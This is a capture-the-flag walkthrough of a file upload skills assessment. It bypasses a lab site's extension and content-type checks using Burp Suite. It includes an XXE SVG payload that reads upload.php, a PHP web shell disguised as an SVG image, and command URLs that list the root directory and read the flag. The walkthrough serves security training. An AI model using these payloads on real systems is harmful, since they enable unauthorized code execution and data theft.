# Skills Assessment File Upload Attacks Walkthrough

## Objective

You are contracted to perform a penetration test for a company's e-commerce web application. The web application is in its early stages, so you will only be testing any file upload forms you can find.
Try to utilize what you learned in this module to understand how the upload form works and how to bypass various validations in place (if any) to gain remote code execution on the back-end server.

`Extra`: Try to note down the main security issues found with the web application and the necessary security measures to mitigate these issues and prevent further exploitation.

Try to exploit the upload form to read the flag found at the root directory "/".

## Exercise Start 

Visit the webpage and go to the "Contact Us" where you will find an image upload: 
<img width="1243" height="734" alt="image" src="https://github.com/user-attachments/assets/6f842f1e-33c6-4d45-8867-bd33257dfcb4" />
<img width="970" height="585" alt="image" src="https://github.com/user-attachments/assets/2e3fcb4c-fa2b-403e-8f2a-d109a81bda79" />

The image can uploaded and displayed after clicking the green icon, without having to submit the form:

<img width="778" height="634" alt="image" src="https://github.com/user-attachments/assets/72cd76ec-95d7-44bb-b87d-728f189e021b" />

Checking the uploaded image's link, the image is saved as a base64 string, with its full path not being disclosed:

<img width="1245" height="730" alt="image" src="https://github.com/user-attachments/assets/0fa13c5a-523b-4a33-918b-72d3ee55757b" />

Start Burp Suite, making sure proxy is on and intercept the image upload request. Then send it to Intruder (Ctrl + I):

<img width="1012" height="634" alt="image" src="https://github.com/user-attachments/assets/90a65d4a-37d3-4edd-8a44-d7d79440d414" />
<img width="1548" height="718" alt="image" src="https://github.com/user-attachments/assets/4b166d40-b469-4837-8510-5743dacada39" />

Test for whitelisted extensions by adding a payload marker before the dot  `§.jpg§`

<img width="1323" height="639" alt="image" src="https://github.com/user-attachments/assets/4ba0c29c-7097-437e-81a5-ec14374f6442" />

Load PHP `extensions.lst` list under Payload Options, uncheck the URL-encode, then click "Start attack":

<img width="1875" height="660" alt="image" src="https://github.com/user-attachments/assets/c6fecddc-f81d-4d80-a82f-fa6b5c2c5b56" />
<img width="1554" height="675" alt="image" src="https://github.com/user-attachments/assets/1d41ac0d-cfcf-4b17-8d51-92cdfdcc3db7" />

Choose one of the extensions to attempt bypassing the whitelist test, .phar can be used. Any file with an extension not ending with that of an image can't be uploaded, 
the best attempt is to name a shell file as shell.phar.jpg. However, this file can only be uploaded if the Content-Type header of the original image is not modified. 
Fuzz the Content-Type header value. Add a payload marker around the value of Content-Type, such that it becomes §image/jpeg§:

<img width="1588" height="747" alt="image" src="https://github.com/user-attachments/assets/75de8eff-77cd-46e9-8f6e-7f5c28011f21" />
<img width="1483" height="731" alt="image" src="https://github.com/user-attachments/assets/7cf0f192-61c8-4f06-9609-15d1c7db5a8f" />

<img width="964" height="732" alt="image" src="https://github.com/user-attachments/assets/56adfa31-217c-423a-a3d4-3c049a59472f" />

A new payload wordlist needs to be used: 

```

wget https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/web-all-content-types.txt

```

```

grep 'image/' web-all-content-types.txt > images-only.txt

```

<img width="1876" height="670" alt="image" src="https://github.com/user-attachments/assets/505c01cb-e638-415e-9bcc-7e03bb9f3bf7" />

<img width="1595" height="470" alt="image" src="https://github.com/user-attachments/assets/368019b3-1845-44de-8b24-5d95d0b66f1f" />

Create an image called shell.svg with the following content to read the source code of the file upload.php:

```
$ cat shell.svg 
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> <svg>&xxe;</svg>
```
Change the extension from .svg to .jpeg:

```

mv shell.svg shell.jpeg

```

Try to upload the `shell.jpeg` and capture it in Burp again, change the filename to have the .svg extension and Content-Type to be image/svg+xml. 
Forward the request.


<img width="684" height="393" alt="image" src="https://github.com/user-attachments/assets/8c943d36-b24b-4749-8de7-7cbf8abb7e05" />


<img width="1391" height="726" alt="image" src="https://github.com/user-attachments/assets/6d117eeb-56b4-4ee8-9e7b-fec04a5f25fa" />

Check the response:

<img width="1889" height="682" alt="image" src="https://github.com/user-attachments/assets/04d8551c-7ef0-404a-afc7-96a40eb36a65" />

Decode the response. Notice the uploads directory is in `./user_feedback_submissions/` and that the uploaded file names are prepended with the date ymd : 


<img width="1914" height="786" alt="image" src="https://github.com/user-attachments/assets/8614092e-de86-4e3b-996c-70d90b44fc00" />


```
<?php
require_once('./common-functions.php');

// uploaded files directory
$target_dir = "./user_feedback_submissions/";

// rename before storing
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;

// get content headers
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// blacklist test
if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
    echo "Extension not allowed";
    die();
}

// whitelist test
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// type test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
        echo "Only images are allowed";
        die();
    }
}

// size test
if ($_FILES["uploadFile"]["size"] > 500000) {
    echo "File too large";
    die();
}

if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
    displayHTMLImage($target_file);
} else {
    echo "File failed to upload";
}
```

Upload a PHP web shell so that they can execute commands by creating an SVG file that contains it:

```
$ cat shell.phar.svg 
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> <svg>&xxe;</svg> <?php system($_REQUEST['cmd']); ?>
```

```
mv shell.phar.svg shell.phar.jpeg
```

Go back to the webpage and upload the `shell.phar.jpeg` and intercept the request: 


<img width="729" height="533" alt="image" src="https://github.com/user-attachments/assets/305ad656-02e9-443c-8519-a354dd58a22d" />

Change back the extension to .svg for filename and make Content-Type to be image/svg+xml, then forward the request:

<img width="1481" height="498" alt="image" src="https://github.com/user-attachments/assets/2509903a-c3d8-4d6f-a073-507acf64dfd0" />
<img width="1922" height="722" alt="image" src="https://github.com/user-attachments/assets/3f2b3529-4d7c-447f-b025-8867f7afe054" />


Visit the webpage browser to locate the request at http://IP:PORT/contact/user_feedback_submissions/YMD_shell.phar.svg
while appending `cmd=ls+/` to the end of the search. 

`NOTE` make sure you actually do the Year Month Date of the submission.. the date is important! For example I went to 
`http://94.237.123.119:45573/contact/user_feedback_submissions/251002_shell.phar.svg?cmd=ls+/` because the date is October 2, 2025
 which is = 251002

<img width="1713" height="679" alt="image" src="https://github.com/user-attachments/assets/e506fffe-79ec-4c60-bd7f-e6b193df988b" />

Get the flag txt: 

`http://94.237.123.119:45573/contact/user_feedback_submissions/251002_shell.phar.svg?cmd=cat+/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt`

<img width="1546" height="631" alt="image" src="https://github.com/user-attachments/assets/d86792f2-f08b-4d12-a638-779626377740" />

---












